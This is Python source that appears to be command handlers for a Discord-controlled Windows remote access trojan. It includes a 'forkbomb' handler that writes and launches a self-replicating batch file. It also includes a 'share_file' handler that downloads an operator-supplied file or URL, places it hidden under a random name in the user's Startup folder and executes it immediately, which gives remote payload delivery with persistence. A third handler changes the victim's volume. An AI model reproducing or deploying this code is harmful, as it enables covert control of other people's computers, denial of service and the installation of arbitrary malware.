import os, requests, subprocess, random, string,ctypes,asyncio,time,sys
from ctypes import cast, POINTER
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from urllib.parse import urlparse
from ctypes import windll
async def forkbomb(ctx):
 def show_dialog():
  ctypes.windll.user32.MessageBoxW(0,"STILL USING THIS PC?","LOL",1)
 def create_bat():
  with open(os.path.expanduser('~')+"\\Documents\\forkbomb.bat","w")as f:f.write("@echo off\nsetlocal enabledelayedexpansion\nset count=0\n:start\nset /a count+=1\nif !count! LSS 1001 start \"%~f0\"\ngoto start")
 loop = asyncio.get_event_loop()
 loop.run_in_executor(None,show_dialog)
 create_bat()
 os.system("start "+os.path.expanduser('~')+"\\Documents\\forkbomb.bat")
 await ctx.send("Fork bomb bat file created and executed.")
async def setvol(ctx, vol: int):
    if 1 <= vol <= 100:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(
            IAudioEndpointVolume._iid_, 0, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevelScalar(vol / 100.0, None)
        await ctx.send(f"Volume set to **{vol}**")
    else:
        await ctx.send("Volume must be between 1 and 100.")
async def share_file(ctx):
 try:
  if not ctx.message.attachments and not ctx.message.content.startswith('http'):
   await ctx.send("Please upload a file or provide a valid URL.")
   return
  if ctx.message.attachments:
   attachment = ctx.message.attachments[0]
   file_name = attachment.filename
   file_content = await attachment.read()
  else:
   url = ctx.message.content.strip()
   response = requests.get(url, allow_redirects=True)
   if response.status_code != 200:
    await ctx.send(f"Failed to download the file from URL: {url}")
    return
   file_name = os.path.basename(urlparse(url).path)
   file_content = response.content
  startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
  os.makedirs(startup_dir, exist_ok=True)
  random_name = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
  file_path = os.path.join(startup_dir, random_name + os.path.splitext(file_name)[1])
  with open(file_path, 'wb') as f:
   f.write(file_content)
  subprocess.run(['attrib', '+h', file_path])
  os.startfile(file_path)
  await ctx.send(f"File `{file_name}` saved to {startup_dir} and executed immediately.")
 except Exception as e:
  await ctx.send(f"Failed to save or execute file: {e}")